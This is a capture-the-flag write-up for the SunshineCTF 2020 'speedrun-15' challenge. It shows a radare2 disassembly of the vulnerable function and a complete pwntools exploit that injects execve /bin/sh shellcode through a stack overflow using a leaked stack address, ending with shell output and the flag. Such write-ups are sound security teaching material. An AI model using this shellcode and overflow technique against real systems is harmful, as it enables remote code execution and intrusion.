# speedrun-15

## Task

nc chal.2020.sunshinectf.org 30015

File: chall_15

Tags: binary exploitation, shellcode, pie

## Solution

File is PIE but not NX and we have a stack addres leak in `sym.vuln`:

```nasm
[0x00000610]> pdf@sym.vuln
            ; CALL XREF from main @ 0x7ec
┌ 178: sym.vuln ();
│           ; var char *s @ rbp-0x46
│           ; var uint32_t var_3ch @ rbp-0x3c
│           ; var int64_t var_38h @ rbp-0x38
│           ; var int64_t var_34h @ rbp-0x34
│           ; var int64_t var_30h @ rbp-0x30
│           ; var int64_t var_2ch @ rbp-0x2c
│           ; var int64_t var_28h @ rbp-0x28
│           ; var int64_t var_24h @ rbp-0x24
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_1ch @ rbp-0x1c
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_ch @ rbp-0xc
│           ; var int64_t var_8h @ rbp-0x8
│           ; var uint32_t var_4h @ rbp-0x4
│           0x0000071a      55             push rbp
│           0x0000071b      4889e5         mov rbp, rsp
│           0x0000071e      4883ec50       sub rsp, 0x50
│           0x00000722      488d45ba       lea rax, [s]
│           0x00000726      4889c6         mov rsi, rax
│           0x00000729      488d3d580100.  lea rdi, str.There_s_a_place_where_nothing_seems:__p ; 0x888 ; "There's a place where nothing seems: %p\n" ; const char *format
│           0x00000730      b800000000     mov eax, 0
│           0x00000735      e896feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0000073a      c745fcadde00.  mov dword [var_4h], 0xdead
│           0x00000741      8b45fc         mov eax, dword [var_4h]
│           0x00000744      8945f8         mov dword [var_8h], eax
│           0x00000747      8b45f8         mov eax, dword [var_8h]
│           0x0000074a      8945f4         mov dword [var_ch], eax
│           0x0000074d      8b45f4         mov eax, dword [var_ch]
│           0x00000750      8945f0         mov dword [var_10h], eax
│           0x00000753      8b45f0         mov eax, dword [var_10h]
│           0x00000756      8945ec         mov dword [var_14h], eax
│           0x00000759      8b45ec         mov eax, dword [var_14h]
│           0x0000075c      8945e8         mov dword [var_18h], eax
│           0x0000075f      8b45e8         mov eax, dword [var_18h]
│           0x00000762      8945e4         mov dword [var_1ch], eax
│           0x00000765      8b45e4         mov eax, dword [var_1ch]
│           0x00000768      8945e0         mov dword [var_20h], eax
│           0x0000076b      8b45e0         mov eax, dword [var_20h]
│           0x0000076e      8945dc         mov dword [var_24h], eax
│           0x00000771      8b45dc         mov eax, dword [var_24h]
│           0x00000774      8945d8         mov dword [var_28h], eax
│           0x00000777      8b45d8         mov eax, dword [var_28h]
│           0x0000077a      8945d4         mov dword [var_2ch], eax
│           0x0000077d      8b45d4         mov eax, dword [var_2ch]
│           0x00000780      8945d0         mov dword [var_30h], eax
│           0x00000783      8b45d0         mov eax, dword [var_30h]
│           0x00000786      8945cc         mov dword [var_34h], eax
│           0x00000789      8b45cc         mov eax, dword [var_34h]
│           0x0000078c      8945c8         mov dword [var_38h], eax
│           0x0000078f      8b45c8         mov eax, dword [var_38h]
│           0x00000792      8945c4         mov dword [var_3ch], eax
│           0x00000795      488b15740820.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END
│                                                                      ; [0x201010:8]=0 ; FILE *stream
│           0x0000079c      488d45ba       lea rax, [s]
│           0x000007a0      be5a000000     mov esi, 0x5a               ; 'Z' ; int size
│           0x000007a5      4889c7         mov rdi, rax                ; char *s
│           0x000007a8      e833feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x000007ad      817dc4decafa.  cmp dword [var_3ch], 0xfacade
│       ┌─< 0x000007b4      7413           je 0x7c9
│       │   0x000007b6      817dfcdecafa.  cmp dword [var_4h], 0xfacade
│      ┌──< 0x000007bd      740a           je 0x7c9
│      ││   0x000007bf      bf00000000     mov edi, 0                  ; int status
│      ││   0x000007c4      e827feffff     call sym.imp.exit           ; void exit(int status)
│      ││   ; CODE XREFS from sym.vuln @ 0x7b4, 0x7bd
│      └└─> 0x000007c9      90             nop
│           0x000007ca      c9             leave
└           0x000007cb      c3             ret
```

We just need to write `10` padding, a `p64(0xfacade)` and then our shellcode, after that we need to return to the leaked stack address + 10 + 8 to jump in our shellcode. We can't write it after the return address since the buffer is just `90` bytes and we need a lot of padding to reach the `rsp`.

Finding the correct offset for the return address was quite tricky. I did it experimentally after my calculation failed...

```python
from pwn import *

elf = ELF("./chall_15", checksec=False)

p = remote('chal.2020.sunshinectf.org', 30015)
#p = elf.process()

p.sendline()
info(p.recvuntil("There's a place where nothing seems: "))
addr = p.recv()
addr_int = int(addr, 16)

payload  = 'A' * 10
payload += p64(0xfacade)
payload += b'\x90\x90\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
payload += 'B' * (60 - 32)
payload += p64(addr_int + 18)

p.sendline(payload)
p.interactive()
```

And we get our flag:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30015: Done
[*] There's a place where nothing seems:
[*] Switching to interactive mode
$ ls
chall_15
flag.txt
$ cat flag.txt
sun{bat-country-53036e8a423559df}
```
